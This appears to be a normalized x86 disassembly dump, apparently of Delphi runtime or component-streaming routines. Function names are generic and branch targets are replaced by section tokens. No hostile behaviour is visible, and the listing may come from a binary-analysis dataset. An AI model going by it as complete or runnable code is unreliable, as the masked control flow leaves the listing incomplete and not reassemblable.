mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41cc7c
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_41b578
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_41cc7c
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c09c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41ed67
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41e518
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_41cc7c
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_41b578
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41cc7c
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_414ac8
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
lea eax [ ebp - 0x1c ]
call sub_405ab8
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d848
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ed6e
mov eax [ ebp - 0xc ]
call sub_40331c
retn
sub_41edd0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41efca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40f4fc
mov eax [ ebp - 0x4 ]
call sub_41cc58
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
jmp [ eax * 4 + jump_table_41ee12 ]
mov eax [ ebp - 0x4 ]
call sub_41e6b8
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d7c8
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_41368c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d7c8
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_41368c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d7c8
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_41368c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d5ac
mov eax ebx
call sub_413884
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d5f0
mov eax ebx
call sub_413884
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d634
mov eax ebx
call sub_4138ac
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d684
mov eax ebx
call sub_413898
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41e518
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4138c0
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41e5d4
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4138ec
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e6b8
cmp al 0x9
sete dl
mov eax ebx
call sub_41385c
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41ec08
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40f824
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d834
push edx
push eax
mov eax ebx
call sub_413788
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41efd1
lea eax [ ebp - 0x1c ]
call sub_40f510
lea eax [ ebp - 0xc ]
call sub_4047f8
lea eax [ ebp - 0x8 ]
call sub_404118
retn
mov eax ebx
call sub_414bb0
jmp r-xdata
sub_41efd8
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_41f1a4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41c0e4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_41f010
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_4210dc
mov edx ebx
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_41f038
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_4210dc
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_41f11c
sub_41f07c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41b4f4
cmp eax esi
jg r-xdata
mov eax ebx
call sub_41f1a4
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41b514
pop esi
pop ebx
retn
mov edx [ ebx + 0x10 ]
add edx eax
cmp esi edx
jle r-xdata
sub esi eax
mov [ ebx + 0x10 ] esi
pop esi
pop ebx
retn
sub_41f0d0
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41f1a4
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41f11c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f193
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov dl 0xa
mov eax ebx
call sub_421328
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41f0d0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_41f0d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f19a
mov eax [ ebp - 0x4 ]
call sub_40331c
retn
sub_41f1d0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41f213
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404300
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_421220
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f21a
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_41f220
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x20 ] edx
xor eax eax
push ebp
push sub_41f2b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0xe
mov eax [ ebp - 0x4 ]
call sub_421328
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41fab4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f2b9
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
retn
mov eax edi
call sub_419a38
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
call sub_41faac
mov edx esi
mov eax edi
call sub_419a40
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41fb00
mov eax [ ebp - 0x4 ]
call sub_41fab4
inc esi
dec ebx
jne r-xdata
sub_41f2c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor esi esi
inc ebx
xor edi edi
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx edi
call sub_418cf8
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_408180
test al al
jne r-xdata
sub_41f310
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41f457
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
or [ eax + 0x1c ] 0x4
mov eax [ ebp - 0x8 ]
call sub_4220a0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_41f2c0
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_422074
or [ eax + 0x1c ] 0x4
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
and [ eax + 0x1c ] 0xfffb
mov eax [ ebp - 0x8 ]
call sub_4220a0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_422074
test [ eax + 0x24 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f45e
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x28 ] edx
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x28
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x20 ] edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_422074
and [ eax + 0x1c ] 0xfffb
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_422074
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41f464
push ebp
mov ebp esp
add esp 0xfffffec8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x138 ] ecx
mov [ ebp - 0x12c ] ecx
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x134 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f840
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_40326c
xor ebx ebx
mov bl [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_4043d8
add ebx eax
inc ebx
add ebx 0x5
add ebx 0x3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x10 ]
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f064
mov [ ebp - 0xc ] eax
mov al [ r-xdata ]
mov [ ebp - 0x25 ] al
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f1a4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
or [ ebp - 0x25 ] 0x1
or [ ebp - 0x25 ] 0x4
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
mov dl [ ebp - 0x25 ]
mov eax [ ebp - 0x4 ]
call sub_41fabc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
cmp eax [ ebx + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_40326c
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x138 ]
call sub_40437c
mov edx [ ebp - 0x138 ]
mov eax [ ebp - 0x4 ]
call sub_421140
mov eax [ ebp - 0x8 ]
call sub_403264
call sub_403544
call sub_414e50
lea edx [ eax + 0xa ]
lea eax [ ebp - 0x130 ]
call sub_40437c
push [ ebp - 0x130 ]
push r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_40326c
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x134 ]
call sub_40437c
push [ ebp - 0x134 ]
lea eax [ ebp - 0x12c ]
mov edx 0x3
call sub_404498
mov edx [ ebp - 0x12c ]
mov eax [ ebp - 0x4 ]
call sub_421140
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
or [ ebp - 0x25 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41fb00
mov eax [ ebp - 0x4 ]
call sub_41fab4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_41f7e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
cmp edx [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_421140
mov eax [ ebp - 0x4 ]
call sub_41f064
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
or [ ebp - 0x25 ] 0x2
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_418cf8
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x20 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f7e8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x1c ]
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x28 ] edx
retn
xor eax eax
push ebp
push sub_41f79f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
push eax
push sub_41f310
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov si 0xfffd
call sub_403518
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_40331c
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0x4 ]
push eax
push sub_41f004
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov si 0xfffd
call sub_403518
test [ ebx + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] ebx
sub_41f7e8
mov eax [ ebp - 0x4 ]
call sub_41fab4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f847
lea eax [ ebp - 0x138 ]
mov edx 0x4
call sub_40413c
retn
mov al [ r-xdata ]
cmp al [ ebp - 0x25 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f064
mov edx [ ebp - 0x10 ]
add edx 0x2
cmp eax edx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41f07c
sub_41f864
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x28 ] ecx
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x18 ] esi
mov [ ebx + 0x1c ] esi
mov eax ebx
call sub_421130
mov edx esi
mov eax ebx
call sub_41f310
pop esi
pop ebx
retn
sub_41f88c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x5
mov eax ebx
call sub_421328
lea edx [ ebp + 0x8 ]
mov ecx 0xa
mov eax ebx
call sub_41f0d0
pop ebx
pop ebp
retn 0xc
sub_41f8b0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0xf
mov eax ebx
call sub_421328
lea edx [ ebp + 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41f0d0
pop ebx
pop ebp
retn 0x4
sub_41f8d4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x10
mov eax ebx
call sub_421328
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41f0d0
pop ebx
pop ebp
retn 0x8
sub_41f8f8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x11
mov eax ebx
call sub_421328
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41f0d0
pop ebx
pop ebp
retn 0x8
sub_41f91c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx r-xdata
mov eax esi
call sub_408180
test al al
je r-xdata
mov edx r-xdata
mov eax esi
call sub_408180
test al al
je r-xdata
mov dl 0x8
mov eax ebx
call sub_421328
pop esi
pop ebx
retn
mov edx r-xdata
mov eax esi
call sub_408180
test al al
je r-xdata
mov dl 0x9
mov eax ebx
call sub_421328
jmp r-xdata
mov edx r-xdata
mov eax esi
call sub_408180
test al al
je r-xdata
xor edx edx
mov eax ebx
call sub_421328
jmp r-xdata
pop esi
pop ebx
retn
mov dl 0x7
mov eax ebx
call sub_421328
mov edx esi
mov eax ebx
call sub_421140
mov dl 0xd
mov eax ebx
call sub_421328
jmp r-xdata
sub_41f9e0
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_421328
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41f0d0
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_421328
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41f0d0
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_421328
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41f0d0
jmp r-xdata
pop edx
pop ebx
retn
sub_41fa54
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov dl 0x13
mov eax ebx
call sub_421328
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41f0d0
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ebx
call sub_41f9e0
jmp r-xdata
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_41fabc
push ebx
push esi
push ecx
mov esi ecx
mov [ esp ] dl
mov ebx eax
mov al [ r-xdata ]
cmp al [ esp ]
je r-xdata
pop edx
pop esi
pop ebx
retn
mov al [ esp ]
or al 0xf0
mov [ esp + 0x1 ] al
lea edx [ esp + 0x1 ]
mov ecx 0x1
mov eax ebx
call sub_41f0d0
test [ esp ] 0x2
je r-xdata
mov edx esi
mov eax ebx
call sub_41f9e0
sub_41fb00
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_403544
call sub_414e50
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_4026ec
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41fbad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_403544
mov edx [ ebp - 0x10 ]
call sub_415054
mov esi [ ebp - 0xc ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0xc ]
shl edx 0x2
mov eax [ ebp - 0x10 ]
call sub_40270c
retn
inc esi
xor edi edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4150a8
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_420b94
mov eax [ ebp - 0x10 ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
sub_41fbc8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_403264
mov edx eax
mov eax [ edi ]
call sub_403530
test al al
jne r-xdata
mov al 0x1
sub_41fbf8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4150d8
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax 0x80000000
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4150d8
cmp ebx eax
sete al
pop ebx
pop ebp
retn
xor eax eax
jmp r-xdata
cmp eax ebx
je r-xdata
pop ebx
pop ebp
retn
mov al 0x1
sub_41fc50
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415608
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
sete al
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415608
fld [ ebp - 0x10 ]
fcompp
fnstsw ax
sahf
sete al
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_41fcac
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415a24
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415a24
cmp edx [ ebp - 0x4 ]
jne r-xdata
sete al
cmp [ ebp - 0x8 ] 0x0
sete al
jmp r-xdata
cmp eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_41fd04
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41fd83
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41544c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_404970
sete bl
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_41544c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_404970
sete bl
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fd8a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404810
retn
sub_41fd94
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
